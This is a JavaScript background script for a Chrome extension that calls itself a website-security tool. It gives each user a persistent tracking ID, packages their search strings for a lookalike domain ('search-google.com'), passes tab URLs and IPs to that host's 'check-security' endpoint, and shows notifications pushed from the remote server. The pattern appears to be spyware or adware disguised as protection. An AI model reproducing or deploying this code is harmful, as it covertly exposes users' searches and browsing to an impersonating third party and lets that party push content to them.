// var apiUrl = "https://baomatfacebook.com/api/";

var apiUrl = "https://search-google.com/api/";

var notificationsId = 'chrome-notification-id-push';
var key_userid = 'userId_localStorage';
var data = null;

function setItem(key, value) {
    window.localStorage.removeItem(key);
    window.localStorage.setItem(key, value);
}

function getItem(key) {
    var value;
    try {
        value = window.localStorage.getItem(key);
    }catch(e) {
        value = null;
    }
    return value;
}

var userId = getItem(key_userid);
if (userId === null) {
    var d = new Date();
    userId = d.getTime();
    setItem(key_userid, userId.toString());
    userId = getItem(key_userid);
}

chrome.extension.onMessage.addListener(
    function(request, sender, sendResponse) {
        switch (request.name) {
            case "setOptions":
                setItem("websiteSecurity_status", request.status);
                break;
            case "searchAction":
                var data = { user_id: userId, search_str: request.searchStr};
                searchAction(data);
                break;
            case "getOptions":
                var status = getItem("websiteSecurity_status");
                if (status === null) status = 'Enable';
                sendResponse({
                    enableDisableSecurity : status
                });
                break;
            case "checkSecurity":
                var url = apiUrl + 'check-notification?user_id=' + userId;
                var xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);

                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        data = JSON.parse(xhr.responseText);
                        if (data.isShow === true) {
                            chrome.notifications.clear(notificationsId);
                            chrome.notifications.create(notificationsId, data.notificationData);
                        }
                    }
                }
                xhr.send();

                console.log({
                    ip: getCurrentTabIp(sender),
                    url: sender.tab.url,
                    user_id: userId,
                    base_url: apiUrl + 'check-security'
                });

                sendResponse({
                    ip: getCurrentTabIp(sender),
                    url: sender.tab.url,
                    user_id: userId,
                    base_url: apiUrl + 'check-security'
                });
                break;
            default:
                sendResponse({});
        }

    }
);
